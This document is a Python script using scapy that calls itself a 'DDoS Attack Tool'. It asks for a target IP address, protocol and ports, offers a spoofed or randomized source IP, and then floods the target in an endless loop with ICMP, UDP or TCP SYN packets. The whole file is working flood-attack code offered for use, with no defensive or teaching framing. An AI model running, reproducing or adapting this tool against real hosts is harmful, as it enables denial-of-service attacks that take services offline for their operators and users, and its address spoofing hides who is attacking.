from curses.ascii import isdigit
from sys import flags
# from select import devpoll
from scapy.all import *
import time

global is_random_ip
is_random_ip = False

global is_random_src_port
is_random_src_port = False

global is_random_dst_port
is_random_dst_port = False

global is_spoof_ip
is_spoof_ip = False

global source_port
source_port = -1

global destination_port
destination_port = -1

# Check IPv4 format
def validate_ip_address(address):
   parts = address.split(".")

   if len(parts) != 4:
      print("-->IP address {} is not valid".format(address))
      return False

   for part in parts:
      # if not isinstance(int(part), int):
      if part.isdigit() is not True:
         print("-->IP address {} is not valid".format(address))
         return False

      if int(part) < 0 or int(part) > 255:
         print("-->IP address {} is not valid".format(address))
         return False
 
   print("-->IP address {} is valid".format(address))
   return True 

# Check port value
def validate_port_number(port):
   if port.isdigit() is not True:
      print("-->Port is not valid")
      return False

   if int(port) < 0 or int(port) > 65536:
      print("-->Port {} is out of range (0-65536)".format(port))
      return False
   
   print("-->Port {} is valid".format(port))
   return True

# Set source IP
def set_source_ip(is_spoof_ip):
   src_IP = ""
   is_random_ip = -1
   if is_spoof_ip == 1:
      while True:
         src_IP = input("Enter IP address of Source: ")

         if src_IP == "":
            print("-->Set random IP")
            is_random_ip = True     
            break

         if validate_ip_address(src_IP):
            break
   return src_IP, is_random_ip

# Set target IP
def set_target_IP():
   target_IP = ""
   while True:
      target_IP = input("Enter IP address of Target: ")

      if target_IP == "":
         print("-->Target IP address is not valid")   
         continue

      if validate_ip_address(target_IP):
         break
   
   return target_IP

# Set source port
def set_source_port(is_random_src_port):
   while True:      
      src_port = input("Enter Source Port Number:")
      if src_port == "":
         print("-->Set random port")
         src_port = -1
         is_random_src_port = True
         break

      if validate_port_number(src_port):
         break

   return int(src_port), is_random_src_port

# Set destination port
def set_destination_port(is_random_dst_port):
   while True:      
      dst_port = input("Enter Destination Port Number:")
      if dst_port == "":
         print("-->Set random port")
         dst_port = -1
         is_random_dst_port = True
         break

      if validate_port_number(dst_port):
         break

   return int(dst_port), is_random_dst_port

i = 1

def rand_ip():
   a = str(random.randint(1,254))
   b = str(random.randint(1,254))
   c = str(random.randint(1,254))
   d = str(random.randint(1,254))
   dot = "."

   rip = a + dot + b + dot + c + dot + d
   
   return rip

def rand_port():
   rport = random.randint(0,65535)

   return rport

def send_packet(IP1, ip_proto, source_port, destination_port, is_random_src_port, is_random_dst_port):
   if ip_proto != 0:
      if is_random_src_port == True:
         source_port = rand_port()
      
      if is_random_dst_port == True:
         destination_port = rand_port()

      if ip_proto == 1:
         TCP1 = TCP(sport = source_port, dport = destination_port, flags = 'S')
         pkt = IP1 / TCP1
         send(pkt, inter = .00001, count = 1000)
         return

      if ip_proto == 2:
         UDP1 = UDP(sport = source_port, dport = destination_port)
         pkt = IP1 / UDP1
         send(pkt, inter = .00001)
         return
   else:
      pkt = IP1 / ICMP()
      send(pkt, inter = .00001)
      return

print("----------------------------------------------------------------")
print("----------------------------------------------------------------")
print("----------------------------------------------------------------")
print("-------------------Welcome to DDoS Attack Tool------------------")
print("------------------------Written by TuanNQ-----------------------")
print("----------------------------------------------------------------")
print("----------------------------------------------------------------")
print("----------------------------------------------------------------")
print("Do you want to spoof source IP address?")
print("Please choose:")
print("    0: No")
print("    1: Yes\n")

spoof_ip = 0
while True:
   spoof_ip = input("--> You press: ")
   if (spoof_ip.isdigit() == False or (int(spoof_ip) != 0 and int(spoof_ip) != 1)):
      print("Please choose either 0 or 1!")
      
   else:
      break

source_ip, is_random_ip = set_source_ip(int(spoof_ip))
target_ip = set_target_IP()

print("Please choose protocol:")
print("    0: ICMP")
print("    1: TCP")
print("    2: UDP\n")

ip_proto = 0
while True:
   ip_proto = input("--> You press: ")
   if (ip_proto.isdigit() == False or (int(ip_proto) != 0 and int(ip_proto) != 1 and int(ip_proto) != 2)):
      print("Please choose either 0 or 1 or 2!")
      
   else:
      ip_proto = int(ip_proto)
      break

if (ip_proto != 0):
   # global source_port
   source_port, is_random_src_port = set_source_port(is_random_src_port)
   # global destination_port
   destination_port, is_random_dst_port = set_destination_port(is_random_dst_port)

print("Starting attack...")
time.sleep(1)

while True:
   # source_ip = rand_ip()
   # source_port = rand_port()

   if is_random_ip == True:
      source_ip = rand_ip()
      IP1 = IP(src = source_ip, dst = target_ip)
      send_packet(IP1, ip_proto, source_port, destination_port, is_random_src_port, is_random_dst_port)
   else:
      IP1 = IP(dst = target_ip)
      send_packet(IP1, ip_proto, source_port, destination_port, is_random_src_port, is_random_dst_port)

   # global pkt
   # pkt = IP1 / ICMP()

   # if ip_proto != 0:
   #    if is_random_src_port == True:
   #       source_port = rand_port()
      
   #    if is_random_dst_port == True:
   #       destination_port = rand_port()

   #    if ip_proto == 1:
   #       TCP1 = TCP(sport = source_port, dport = destination_port)
   #       pkt = IP1 / TCP1
   #       send(pkt, inter = .00001)

   #    if ip_proto == 2:
   #       UDP1 = UDP(sport = source_port, dport = destination_port)
   #       pkt = IP1 / UDP1
   #       send(pkt, inter = .00001)
   # else:
   #    pkt = IP1 / ICMP()
   #    send(pkt, inter = .00001)
   
   # TCP1 = TCP(sport = source_port, dport = 80)
   # UDP1 = UDP(sport = source_port, dport = destination_port)
   # pkt = IP1 / TCP1
   # pkt = IP1 / UDP1
   # pkt = IP1 / ICMP()
   # send(pkt, inter = .00001)
   print ("packet sent ", i)
   i = i + 1